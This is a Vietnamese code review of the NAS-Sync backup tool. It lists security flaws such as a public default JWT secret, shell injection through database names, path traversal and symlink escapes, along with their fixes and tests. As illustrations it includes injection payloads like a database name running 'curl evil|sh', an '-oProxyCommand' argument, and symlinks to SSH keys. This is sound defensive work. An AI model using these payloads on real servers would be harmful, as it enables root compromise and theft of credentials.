# Code Review — nhánh `wnreview`

Review toàn bộ dự án NAS-Sync (base: `main` @ `e02e1b3`, v1.1.4).

## Đánh giá chung

Code có cấu trúc rõ ràng: adapter riêng cho từng panel, engine tách khỏi API route, hàng đợi có
fallback khi không có Redis, typecheck + build sạch, CI đã chạy cả hai. Các phần khó như restore
cross-panel, GFS retention, hardlink incremental và sandbox verify đều được làm khá kỹ.
Phần lớn truy vấn SQL dùng tham số `?` đúng cách, explorer có kiểm tra path traversal cơ bản, mật
khẩu hash bằng scrypt và so sánh timing-safe.

**Điểm yếu lớn nhất là bảo mật.** Ứng dụng giữ SSH key root của mọi VPS và chạy lệnh shell với
quyền root trên các VPS đó, nên một lỗ hổng ở đây là chiếm quyền toàn bộ hạ tầng. Có 2 lỗi mức
**critical** (đã sửa trong nhánh này):

1. Bản cài mặc định dùng JWT secret công khai, nên ai cũng tự ký được cookie admin.
2. Tên database do khách hàng hosting tự đặt bị nội suy vào lệnh shell, dẫn tới RCE root trên VPS
   và RCE trên NAS.

## Đã sửa trong nhánh này

| # | Mức | Vấn đề | Cách sửa |
|---|-----|--------|----------|
| 1 | Critical | `JWT_SECRET` mặc định công khai: `docker-compose.yml` dùng `nas-sync-open-source-change-this-secret-2026` và `jwt-edge.ts` có fallback cứng. Ai đọc repo cũng ký được token admin cho mọi bản cài không đổi secret. | Thêm `src/lib/jwt-secret.ts`. Nếu `JWT_SECRET` trống, ngắn hơn 32 ký tự hoặc trùng giá trị mẫu, hệ thống tự sinh khóa ngẫu nhiên lưu ở `DATA_DIR/.jwt_secret` (0600). `jwt-edge.ts` không còn fallback mà fail-closed. Compose và `.env.example` để trống mặc định. |
| 2 | Critical | **Shell injection qua tên DB.** Tên DB lấy từ `SHOW DATABASES` (khách cPanel/DA tạo được ``CREATE DATABASE `user_$(curl evil\|sh)` ``) được đặt trong `"..."` bên trong `bash -c '...'` của mysqldump, nên `$(...)` chạy với quyền root trên VPS. Cùng tên đó thành tên file dump rồi bị nội suy vào `bash -c` cục bộ của sandbox verify và restore, tức là RCE trên NAS, nơi giữ SSH key của mọi VPS khác. | Thêm `src/lib/engine/safe-names.ts` (validate domain, user, DB, webroot, host). `finalizeDiscoveredDomains` loại bỏ domain/DB có tên nguy hiểm, mọi adapter đều đi qua hàm này. mysqldump dùng `shellSingleQuote`. `sandbox-verifier` và `restore-worker` truyền đường dẫn và tham số qua `"$1"` / `"$@"` thay vì nội suy chuỗi. |
| 3 | High | Domain từ VPS được ghép thẳng vào `path.join(...)` trên NAS rồi chạy `rsync --delete`. Một VPS bị chiếm có thể trả về `../../<host khác>/...` để xóa snapshot của server khác. | Validate domain ở bước discovery (mục 2). |
| 4 | High | Restore không validate `targetDomainName`, `targetSystemUser`, `targetWebrootOverride` và `targetDbMap`. Webroot `/` biến thành `user@ip:/`, khiến `rsync --delete` + `chown -R` chạy trên toàn bộ ổ của VPS đích. Tên domain hoặc DB chứa `` ` ``/`$()` chạy lệnh root trên VPS đích. | `assertSafe(...)` cho cả 4 trường. Webroot phải là path tuyệt đối, có ít nhất 3 cấp và không chứa `..`. |
| 5 | High | Socket.IO không xác thực và bật `cors: '*'`. Bất kỳ ai truy cập được cổng đều nghe được live log, cảnh báo và tiến trình update. | `io.use()` kiểm tra cookie phiên và bỏ CORS. Client tự kết nối lại sau khi đăng nhập. |
| 6 | Medium | `ip_address` và `ssh_user` không validate, sau đó vào `bash -c` của restore (`1.2.3.4; cmd`) và tham số ssh (`-oProxyCommand=...`). `hostname` thành thư mục trên NAS mà không chặn `../`. | `validateServerConnectionFields()` ở POST/PATCH `/api/servers`. |
| 7 | Medium | Đăng nhập không giới hạn số lần thử, nên có thể dò mật khẩu admin (mặc định `nas-sync@2026`). | `src/lib/login-throttle.ts`: khóa 15 phút sau 10 lần sai theo cặp IP + username, trả về HTTP 429. |
| 8 | Medium | Explorer đi theo symlink trong snapshot. Snapshot sao chép nguyên symlink từ VPS, nên khách hosting tạo `x -> /app/data/nas-sync.db` hoặc `/root/.ssh/<key>` là đọc/tải được file trong container NAS. | `resolveSafeSubPath` kiểm tra `realpath` nằm trong snapshot. |
| 9 | Medium | Lỗi ghi file dump (ENOSPC khi volume đầy) không có listener `error`, gây uncaught exception làm sập cả tiến trình Node và mọi job đang chạy. | Thêm listener `error` (kill ssh, xóa `.part`, reject) và bọc callback rename/stat trong try/catch. |
| 10 | Medium | Download đọc toàn bộ file vào RAM (`readFileSync`). Dump hoặc archive vài GB sẽ OOM hoặc vượt giới hạn Buffer. | Stream bằng `fs.createReadStream` và dùng `filename*=UTF-8''` cho tên file Unicode. |
| 11 | Low | Explorer gặp symlink hỏng (rất phổ biến trong WordPress) thì `statSync` ném ENOENT và hỏng cả danh sách thư mục. | Fallback sang `lstatSync`. |
| 12 | Low | Import SSH key ghi đè file sẵn có trong `/root/.ssh` (VD đặt tên `authorized_keys`, `config` hoặc tên key đang dùng). | Từ chối nếu file đã tồn tại. |
| 13 | Low | Cookie phiên thiếu cờ `Secure` khi chạy sau HTTPS reverse proxy. Option cookie bị lặp ở 3 chỗ. | `sessionCookieOptions(req)` trong `auth.ts` bật `Secure` theo `x-forwarded-proto`. |

### Kiểm tra đã chạy

- `npm run typecheck` và `npm run build`: pass.
- Smoke test trên server thật (`npm start`, Windows, Local Queue): 14/14 pass.
  - API không cookie trả 401.
  - Token ký bằng secret mặc định cũ trả 401.
  - 10 lần login sai thì lần thứ 11 trả 429.
  - Admin login OK.
  - Cờ `Secure` chỉ bật khi đi qua HTTPS proxy.
  - Socket.IO từ chối khi không có cookie, chấp nhận khi có.
  - POST server với IP chứa injection, hostname `../` hoặc ssh_user `-o...` đều trả 400; server bình thường vẫn được nhận.
- Unit check validator và `finalizeDiscoveredDomains`: 13/13 pass. Đã kiểm tra tên file `db_$(touch PWNED).sql` đi qua pipeline `bash -c` mới mà không bị thực thi.
- **Chưa test được:** backup/restore thật với VPS DirectAdmin/cPanel/Plesk/aaPanel, và kiểm tra symlink trên Linux (Windows cần quyền admin để tạo symlink). Cần chạy thử 1 vòng backup + restore trên NAS thật trước khi merge.

### Lưu ý khi nâng cấp

- Bản cài đang dùng `JWT_SECRET` mặc định sẽ tự chuyển sang khóa ngẫu nhiên, nên mọi người phải **đăng nhập lại 1 lần**.
- Domain hoặc DB có tên chứa ký tự lạ (ngoài chữ, số, `.`, `_`, `-`) giờ bị **bỏ qua khi backup** và ghi cảnh báo `[NAS-Sync Security]` ra log container. Nếu có khách hợp lệ bị bỏ sót, cần nới regex trong `safe-names.ts`.

## Đã hoàn tất bổ sung trong `v1.2.0` (Security Hardening & Mobile UX/UI)

Toàn bộ các mục đề xuất ở phần kế tiếp cùng 5 lỗ hổng mức Critical phát hiện thêm qua kiểm định sâu đã được xử lý triệt để trong **`v1.2.0`**:

- [x] **Khóa Mutex theo `server_id` & Bảo vệ Snapshot khi đang Restore** (`queue.ts`, `retention-gfs.ts`, `api/jobs/[id]/route.ts`).
- [x] **Gia cố Self-Update & Entrypoint** (`updater.ts`, `docker-entrypoint.sh`, `update-synology.sh`): khóa chống chạy chồng `__nasSyncUpdating` kể cả khi `force: true`, chặn khi có job đang chạy, sao lưu SQLite nguyên tử bằng `VACUUM INTO`, cài package với `--ignore-scripts` và tự đồng bộ `dependencies` trong `docker-entrypoint.sh`.
- [x] **Che giấu Secret (`••••••••`) trên `GET /api/settings` & ẩn `REDIS_URL` khỏi `/api/health`** (`api/settings/route.ts`, `api/health/route.ts`, `queue.ts`).
- [x] **Chuyển Synology DSM Btrfs WORM API từ `GET` sang `POST` body** (`btrfs-worm.ts`), hỗ trợ HTTPS tự ký LAN `:5001` và timeout 15 giây.
- [x] **Thu hồi phiên JWT tức thời bằng `token_version`** khi đăng xuất hoặc đổi mật khẩu (`db.ts`, `jwt-edge.ts`, `auth.ts`, `server.ts`, `api/auth/**`).
- [x] **Chống CSRF qua kiểm tra `Origin` / `Host`** trên mọi API `POST/PUT/PATCH/DELETE` (`src/middleware.ts`) và Socket.IO `io.use()` (`server.ts`).
- [x] **Khóa RCE qua `/root/.ssh/config` (`-F /dev/null`) & giới hạn `ssh_key_path` / `mount_path`** (`ssh.ts`, `api/ssh-keys/**`, `api/servers/**`, `api/volumes/**`).
- [x] **Ẩn mật khẩu Master MySQL khỏi `ps aux`** trên cả 4 Control Panel & MariaDB Sandbox (`base.ts`, `directadmin.ts`, `cpanel.ts`, `plesk.ts`, `aapanel.ts`, `sandbox-verifier.ts`).
- [x] **Kiểm tra vùng giam `realpath` cho Webroot chống leo thang đặc quyền Symlink**, dùng `chown -hR`, sửa quyền `755/644` trên aaPanel, chống Gzip Bomb & FIFO trong Explorer (`explorer.ts`, `download/route.ts`).
- [x] **Bổ sung timeout + theo dõi hủy tiến trình con**, chỉ cập nhật symlink `latest` sau khi vượt qua Anomaly & Sandbox Verify (`backup-worker.ts`, `restore-worker.ts`), và đồng bộ múi giờ Local nhất quán cho GFS (`retention-gfs.ts`).
- [x] **Chuẩn hóa 100% UX/UI Mobile-First (`320px` – `1024px`)** trên toàn bộ 12 tập tin giao diện Frontend.
